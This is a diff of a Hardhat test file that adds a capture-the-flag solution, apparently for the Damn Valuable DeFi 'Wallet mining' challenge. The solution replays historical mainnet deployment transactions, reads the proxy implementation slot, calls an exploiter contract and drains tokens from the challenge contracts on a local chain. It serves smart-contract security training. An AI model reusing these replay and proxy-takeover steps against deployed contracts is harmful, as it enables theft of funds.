@@ -1,102 +1,211 @@
-const { ethers, upgrades } = require('hardhat');
-const { expect } = require('chai');
+const { ethers, upgrades } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Wallet mining', function () {
-    let deployer, player;
-    let token, authorizer, walletDeployer;
-    let initialWalletDeployerTokenBalance;
-    
-    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
-    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
+describe("[Challenge] Wallet mining", function () {
+  let deployer, player;
+  let token, authorizer, walletDeployer;
+  let initialWalletDeployerTokenBalance;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, ward, player ] = await ethers.getSigners();
+  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
+  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;
 
-        // Deploy Damn Valuable Token contract
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, ward, player] = await ethers.getSigners();
 
-        // Deploy authorizer with the corresponding proxy
-        authorizer = await upgrades.deployProxy(
-            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
-            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
-            { kind: 'uups', initializer: 'init' }
-        );
-        
-        expect(await authorizer.owner()).to.eq(deployer.address);
-        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
-        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
+    // Deploy Damn Valuable Token contract
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
 
-        // Deploy Safe Deployer contract
-        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
-            token.address
-        );
-        expect(await walletDeployer.chief()).to.eq(deployer.address);
-        expect(await walletDeployer.gem()).to.eq(token.address);
-        
-        // Set Authorizer in Safe Deployer
-        await walletDeployer.rule(authorizer.address);
-        expect(await walletDeployer.mom()).to.eq(authorizer.address);
+    // Deploy authorizer with the corresponding proxy
+    authorizer = await upgrades.deployProxy(
+      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
+      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
+      { kind: "uups", initializer: "init" }
+    );
 
-        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
-        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
+    expect(await authorizer.owner()).to.eq(deployer.address);
+    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
+    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
 
-        // Fund Safe Deployer with tokens
-        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
-        await token.transfer(
-            walletDeployer.address,
-            initialWalletDeployerTokenBalance
-        );
+    // Deploy Safe Deployer contract
+    walletDeployer = await (
+      await ethers.getContractFactory("WalletDeployer", deployer)
+    ).deploy(token.address);
+    expect(await walletDeployer.chief()).to.eq(deployer.address);
+    expect(await walletDeployer.gem()).to.eq(token.address);
 
-        // Ensure these accounts start empty
-        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
-        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
-        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');
+    // Set Authorizer in Safe Deployer
+    await walletDeployer.rule(authorizer.address);
+    expect(await walletDeployer.mom()).to.eq(authorizer.address);
 
-        // Deposit large amount of DVT tokens to the deposit address
-        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
+    await expect(
+      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
+    ).not.to.be.reverted;
+    await expect(
+      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
+    ).to.be.reverted;
 
-        // Ensure initial balances are set correctly
-        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
-        expect(await token.balanceOf(walletDeployer.address)).eq(
-            initialWalletDeployerTokenBalance
-        );
-        expect(await token.balanceOf(player.address)).eq(0);
-    });
+    // Fund Safe Deployer with tokens
+    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
+    await token.transfer(
+      walletDeployer.address,
+      initialWalletDeployerTokenBalance
+    );
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+    // Ensure these accounts start empty
+    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
+    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
+      "0x"
+    );
+    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
+      "0x"
+    );
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    // Deposit large amount of DVT tokens to the deposit address
+    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
 
-        // Factory account must have code
-        expect(
-            await ethers.provider.getCode(await walletDeployer.fact())
-        ).to.not.eq('0x');
+    // Ensure initial balances are set correctly
+    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
+    expect(await token.balanceOf(walletDeployer.address)).eq(
+      initialWalletDeployerTokenBalance
+    );
+    expect(await token.balanceOf(player.address)).eq(0);
+  });
 
-        // Master copy account must have code
-        expect(
-            await ethers.provider.getCode(await walletDeployer.copy())
-        ).to.not.eq('0x');
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const IMPLEMENTATION_SLOT =
+      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+    const authorizerImplementationAddress =
+      "0x" +
+      (
+        await ethers.provider.getStorageAt(
+          authorizer.address,
+          IMPLEMENTATION_SLOT
+        )
+      )
+        .toString()
+        .substring(26, 66);
 
-        // Deposit account must have code
-        expect(
-            await ethers.provider.getCode(DEPOSIT_ADDRESS)
-        ).to.not.eq('0x');
-        
-        // The deposit address and the Safe Deployer contract must not hold tokens
-        expect(
-            await token.balanceOf(DEPOSIT_ADDRESS)
-        ).to.eq(0);
-        expect(
-            await token.balanceOf(walletDeployer.address)
-        ).to.eq(0);
+    const ExploiterFactory = await ethers.getContractFactory(
+      "contracts/wallet-mining/Exploiter.sol:Exploiter",
+      deployer
+    );
+    const exploiter = await ExploiterFactory.deploy(
+      authorizerImplementationAddress,
+      walletDeployer.address,
+      ward.address
+    );
 
-        // Player must own all tokens
-        expect(
-            await token.balanceOf(player.address)
-        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
-    });
+    // replay mainnet deployer txs to deploy gnosis safe and gnosis safe proxy factory
+    const DEPLOYER_ADDRESS = "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a";
+    let tx, unsignedTx, signature, replayTx;
+    tx = {
+      to: DEPLOYER_ADDRESS,
+      value: ethers.utils.parseEther("1"),
+    };
+    await player.sendTransaction(tx);
+
+    // https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+    tx = await ethers
+      .getDefaultProvider()
+      .getTransaction(
+        "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3"
+      );
+    unsignedTx = {
+      to: tx.to,
+      nonce: tx.nonce,
+      gasLimit: tx.gasLimit,
+      gasPrice: tx.gasPrice,
+      data: tx.data,
+      value: tx.value,
+    };
+    signature = {
+      v: tx.v,
+      r: tx.r,
+      s: tx.s,
+    };
+    replayTx = ethers.utils.serializeTransaction(unsignedTx, signature);
+    await ethers.provider.sendTransaction(replayTx);
+
+    // https://etherscan.io/tx/0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4
+    tx = await ethers
+      .getDefaultProvider()
+      .getTransaction(
+        "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4"
+      );
+    unsignedTx = {
+      to: tx.to,
+      nonce: tx.nonce,
+      gasLimit: tx.gasLimit,
+      gasPrice: tx.gasPrice,
+      data: tx.data,
+      value: tx.value,
+    };
+    signature = {
+      v: tx.v,
+      r: tx.r,
+      s: tx.s,
+    };
+    replayTx = ethers.utils.serializeTransaction(unsignedTx, signature);
+    ethers.provider.sendTransaction(replayTx);
+
+    // https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+    tx = await ethers
+      .getDefaultProvider()
+      .getTransaction(
+        "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261"
+      );
+    unsignedTx = {
+      to: tx.to,
+      nonce: tx.nonce,
+      gasLimit: tx.gasLimit,
+      gasPrice: tx.gasPrice,
+      data: tx.data,
+      value: tx.value,
+    };
+    signature = {
+      v: tx.v,
+      r: tx.r,
+      s: tx.s,
+    };
+    replayTx = ethers.utils.serializeTransaction(unsignedTx, signature);
+    await ethers.provider.sendTransaction(replayTx);
+
+    // deploy contract at DEPOSIT_ADDRESS, sweep tokens and attack authorizer
+    await exploiter.connect(player).attack();
+
+    // deploy 43 wallets to get 43 tokens
+    for (let i = 0; i < 43; i++) {
+      await walletDeployer.connect(player).drop("0x");
+    }
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Factory account must have code
+    expect(
+      await ethers.provider.getCode(await walletDeployer.fact())
+    ).to.not.eq("0x");
+
+    // Master copy account must have code
+    expect(
+      await ethers.provider.getCode(await walletDeployer.copy())
+    ).to.not.eq("0x");
+
+    // Deposit account must have code
+    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");
+
+    // The deposit address and the Safe Deployer contract must not hold tokens
+    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
+    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);
+
+    // Player must own all tokens
+    expect(await token.balanceOf(player.address)).to.eq(
+      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
+    );
+  });
 });
